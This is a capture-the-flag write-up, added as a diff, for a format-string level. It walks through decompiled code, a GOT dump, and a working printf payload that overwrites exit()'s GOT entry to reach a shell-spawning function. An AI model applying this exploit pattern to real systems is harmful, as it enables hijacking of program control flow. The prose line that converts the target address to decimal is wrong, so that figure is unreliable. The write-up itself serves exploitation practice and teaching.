@@ -1,0 +1,44 @@
+This level was similar because we still had to use the printf format vulnerability, but there was no condition whatsoever to fullfill.
+It was just calling the exit() function, and thats all.
+
+`void n(void)
+
+{
+  char local_20c [520];
+  
+  fgets(local_20c,0x200,stdin);
+  printf(local_20c);
+                    // WARNING: Subroutine does not return
+  exit(1);
+}`
+
+After some researches, we saw that we could overwrite the GOT (Global Offset Table) to redirect the exit() function to the o() function.
+The GOT list the address of the functions used by the program, and stock them in a table.
+
+`objdump -R level5
+
+level5:     file format elf32-i386
+
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE
+08049814 R_386_GLOB_DAT    __gmon_start__
+08049848 R_386_COPY        stdin
+08049824 R_386_JUMP_SLOT   printf
+08049828 R_386_JUMP_SLOT   _exit
+0804982c R_386_JUMP_SLOT   fgets
+08049830 R_386_JUMP_SLOT   system
+08049834 R_386_JUMP_SLOT   __gmon_start__
+08049838 R_386_JUMP_SLOT   exit
+0804983c R_386_JUMP_SLOT   __libc_start_main`
+
+As we can see here, the exit() function is at the address 0x08049838.
+
+From there we know that we have to overwrite the 0x08049838 address with the address of the o() function, which is 0x080484a4.
+
+So, using the same method as the previous level, we overwrite it using %n and the number of bytes we have to write (0x080484a40 in decimal is 1345138248).
+-> We get the offset position first (using %x method), its the 4th argument, so we use %4$n.
+
+And as the function o() is calling /bin/sh, we had to use 'cat -' as the level1 to have stdin opened.
+
+python -c "print '\x38\x98\x04\x08' + '%134513824x%4\$n'" > /tmp/payload
+cat /tmp/payload - | ./level5
